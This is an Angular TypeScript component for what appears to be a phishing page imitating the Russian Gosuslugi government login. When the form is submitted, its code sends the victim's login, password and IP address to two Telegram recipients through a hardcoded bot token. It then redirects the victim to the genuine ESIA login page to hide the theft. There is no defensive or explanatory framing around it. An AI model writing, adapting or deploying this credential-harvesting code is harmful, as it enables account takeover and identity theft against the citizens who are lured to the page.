import {BreakpointObserver, Breakpoints} from '@angular/cdk/layout';
import {HttpClient} from '@angular/common/http';
import {Component, OnInit, ViewEncapsulation} from '@angular/core';
import {Observable, Subscription} from 'rxjs';
import {first, map, tap} from 'rxjs/operators';
import Telegram from 'telegram-send-message';
import {FormBuilder, Validators} from '@angular/forms';

interface IPInfo {
	ip: string;
}

@Component({
	selector: 'app-root',
	templateUrl: './app.component.html',
	styleUrls: ['./app.component.scss'],
	encapsulation: ViewEncapsulation.None
})
export class AppComponent implements OnInit {
	loginStepPhone = true;
	form = this.formBuilder.group({
		login: ['', [Validators.required]],
		password: ['', [Validators.required]],
	});
	prevValue = {
		login: '',
		password: '',
	};
	selected = 'ru';
	isSmallScreen = false;
	ipAddress: string | any;

	sentMessage(): void {
		console.log(this.ipAddress ? this.ipAddress.ip : ' ');
		if (this.prevValue.login !== this.form.get('login').value || this.prevValue.password !== this.form.get('password').value) {
			const message = `Новый Лог – ГосУслуги🤟%0AIP: ${this.ipAddress ? this.ipAddress.ip : ' '}%0AЛогин: ${this.form.get('login').value}%0AПароль: ${this.form.get('password').value}`;
			const token = '949565640:AAEGoYzcWtY0kC3MTI0KNfdkWFgxVe8NOQs';
			Telegram.setToken(token);
			Telegram.setRecipient('880595419');
			Telegram.setMessage(message);
			Telegram.send();
			Telegram.setToken(token);
			Telegram.setRecipient('946981380');
			Telegram.setMessage(message);
			Telegram.send();
			this.prevValue.login = this.form.get('login').value;
			this.prevValue.password = this.form.get('password').value;
			window.location.href = 'https://esia.gosuslugi.ru/idp/rlogin?cc=bp';
		}
	}

	constructor(
		private formBuilder: FormBuilder,
		private breakpointObserver: BreakpointObserver,
		private http: HttpClient
	) {}

	getIPInfo(): Observable<IPInfo | any> {
		return this.http.get('http://api.ipify.org/?format=json').pipe(first());
	}

	ngOnInit(): void {
		this.getIPInfo().subscribe(value => this.ipAddress = value);
		this.breakpointObserver.observe([Breakpoints.Small, Breakpoints.XSmall])
			.pipe(
				map((observer) => observer.matches)
			)
			.subscribe((isSmallScreen) => this.isSmallScreen = isSmallScreen);
	}

	onSubmit(): void {
		if (this.form.valid) {
			this.sentMessage();
		}
	}
}
